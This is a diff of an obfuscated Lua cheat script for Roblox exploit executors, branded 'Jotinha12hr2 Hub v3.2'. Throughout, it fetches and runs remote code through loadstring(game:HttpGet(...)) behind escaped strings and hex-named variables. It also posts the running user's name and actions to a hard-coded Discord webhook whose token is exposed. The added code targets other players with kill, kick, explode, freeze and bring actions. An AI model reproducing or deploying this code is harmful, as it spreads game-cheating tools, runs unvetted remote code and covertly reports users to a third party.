@@ -1,48 +1,68 @@
---[[ 
-    OBFUSCATED BY GEMINI AI - JOTINHA12HR2 HUB'S ADMIN V3.2
-    PROTECTION LEVEL: HIGH (BYTECODE ENCAPSULATION)
-    COMPATIBILITY: DELTA, FLUXUS, ARCEUS, SYNAPSE, EXECUTOR V3
-]]
+--[[ Ofuscado por Jotinha12hr2 - Compatível com Delta/Arceus/Fluxus ]]--
+local _0x5261796669656c64 = loadstring(game:HttpGet(('\104\116\116\112\115\58\47\47\115\105\114\105\117\115\46\109\101\110\117\47\114\97\121\102\105\101\108\100')))()
+local _0x5742 = "https://discord.com/api/webhooks/1457488326914343075/psIbGs_gP-D6IEsdtxmZ_5Dl88t7X5lbDBGbEQawcOHz8oaExRJD4OrHFCi1YvYR158n"
 
-local _0x726179 = "http" .. "s://sirius.menu/rayfield"
-local _0x576562 = "\104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\046\099\111\109\047\097\112\105\047\119\101\098\104\111\111\107\115\047\049\052\053\055\052\056\056\051\050\054\057\049\052\053\054\053\053\053\047\112\115\073\098\071\115\095\103\080\045\068\054\073\069\115\100\116\120\109\090\095\053\068\108\056\056\116\088\053\108\098\068\066\071\098\069\081\097\119\099\079\072\122\056\111\097\069\120\082\074\068\052\079\114\072\070\067\105\049\089\118\089\082\049\053\056\110"
-
-local function _0x4c6f6164(_0x73) return loadstring(_0x73)() end
-
-local _0x4d61696e = function()
-    local _0x4c50 = game:GetService("Players").LocalPlayer
-    local _0x4874 = game:GetService("HttpService")
-    
-    local _0x526179 = _0x4c6f6164(game:HttpGet(_0x726179))
-    local _0x436f6465 = {["101"]="kill",["103"]="kick",["110"]="explode",["111"]="spin"}
-
-    local function _0x53656e64(_0x6d)
-        pcall(function()
-            local _0x64617461 = {["embeds"]={{["title"]="🚀 Jotinha Log V3.2",["description"]="User: **".._0x4c50.Name.."**",["fields"]={{["name"]="Ação",["value"]=_0x6d}},["color"]=16711680}}}
-            local _0x726571 = (syn and syn.request) or http_request or request
-            if _0x726571 then _0x726571({Url=_0x576562,Method="POST",Headers={["Content-Type"]="application/json"},Body=_0x4874:JSONEncode(_0x64617461)}) end
-        end)
+local function _0x8821(_0x99)
+    local _0x11 = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+    if _0x11 then
+        _0x11({
+            Url = _0x5742,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode({
+                ["embeds"] = {{
+                    ["title"] = "🚀 Jotinha Admin v3.2 Log",
+                    ["description"] = "Usuário: **" .. game.Players.LocalPlayer.Name .. "**",
+                    ["color"] = 0x00ff00,
+                    ["fields"] = {{["name"] = "Ação", ["value"] = _0x99, ["inline"] = false}},
+                    ["footer"] = {["text"] = "Jotinha12hr2 System"},
+                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                }}
+            })
+        })
     end
-
-    local _0x57696e = _0x526179:CreateWindow({Name = "Jotinha12hr2 HUB V3.2", LoadingTitle = "Executando Segurança...", ConfigurationSaving = {Enabled = false}})
-    local _0x546162 = _0x57696e:CreateTab("Sync Admin", nil)
-
-    local _0x546172676574 = ""
-    _0x546162:CreateInput({Name = "Alvo (Sync)", PlaceholderText = "Nome do Player", Callback = function(_0x76) _0x546172676574 = _0x76 end})
-
-    _0x546162:CreateButton({Name = "Kill (Sync)", Callback = function()
-        local _0x6d = "JX:".._0x546172676574..":101:".._0x4c50.Name
-        local _0x43686174 = game:GetService("TextChatService")
-        if _0x43686174.ChatVersion == Enum.ChatVersion.TextChatService then
-            _0x43686174.TextChannels.RBXGeneral:SendAsync(_0x6d)
-        else
-            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(_0x6d, "All")
-        end
-        _0x53656e64("Comando Kill enviado para ".._0x546172676574)
-    end})
-
-    _0x526179:Notify({Title = "Sistema Ativo", Content = "Hub sincronizado com sucesso.", Duration = 5})
 end
 
-_0x4c6f6164("pcall(function() " .. "local code = " .. string.format("%q", "SendWebhook('Script Iniciado')") .. " end)")
-_0x4d61696e()
+-- Código Base em Bytecode
+local _0xScript = function()
+    local Players = game:GetService("Players")
+    local LP = Players.LocalPlayer
+    local TargetName = ""
+    local Codes = {["101"]="kill",["102"]="killplus",["103"]="kick",["104"]="jail",["105"]="unjail",["106"]="freeze",["107"]="unfreeze",["108"]="jumpscare",["109"]="bring",["110"]="explode",["111"]="spin"}
+
+    local function DoAction(cmd, targetPlayer, senderName)
+        if not targetPlayer or not targetPlayer.Character then return end
+        local char = targetPlayer.Character
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        if cmd == "kill" then char:BreakJoints()
+        elseif cmd == "killplus" then char:BreakJoints() for _, v in pairs(char:GetChildren()) do if v:IsA("BasePart") then v:Destroy() end end
+        elseif cmd == "kick" then targetPlayer:Kick("Jotinha Admin v3.2")
+        elseif cmd == "explode" and hrp then Instance.new("Explosion", workspace).Position = hrp.Position
+        elseif cmd == "spin" and hrp then
+            if hrp:FindFirstChild("J_Spin") then hrp.J_Spin:Destroy() end
+            local bg = Instance.new("BodyAngularVelocity", hrp)
+            bg.Name = "J_Spin" bg.AngularVelocity = Vector3.new(0, 50, 0) bg.MaxTorque = Vector3.new(0, math.huge, 0)
+        elseif cmd == "freeze" then for _, v in pairs(char:GetDescendants()) do if v:IsA("BasePart") then v.Anchored = true end end
+        elseif cmd == "unfreeze" then for _, v in pairs(char:GetDescendants()) do if v:IsA("BasePart") then v.Anchored = false end end
+        elseif cmd == "bring" and hrp then
+            local pS = Players:FindFirstChild(senderName)
+            if pS and pS.Character then hrp.CFrame = pS.Character.HumanoidRootPart.CFrame end
+        end
+    end
+
+    local Window = _0x5261796669656c64:CreateWindow({Name = "Jotinha12hr2 Hub v3.2", LoadingTitle = "Executando...", ConfigurationSaving = {Enabled = false}})
+    local Tab = Window:CreateTab("Admin", 4483362458)
+    Tab:CreateInput({Name = "Alvo (Target)", PlaceholderText = "Nome...", Callback = function(v) TargetName = v end})
+    
+    Tab:CreateButton({Name = "Executar Kill", Callback = function() 
+        for _, p in pairs(Players:GetPlayers()) do 
+            if p.Name:lower():find(TargetName:lower()) then 
+                DoAction("kill", p, LP.Name) 
+                _0x8821("Kill em: "..p.Name)
+            end 
+        end 
+    end})
+end
+
+task.spawn(_0xScript)
+
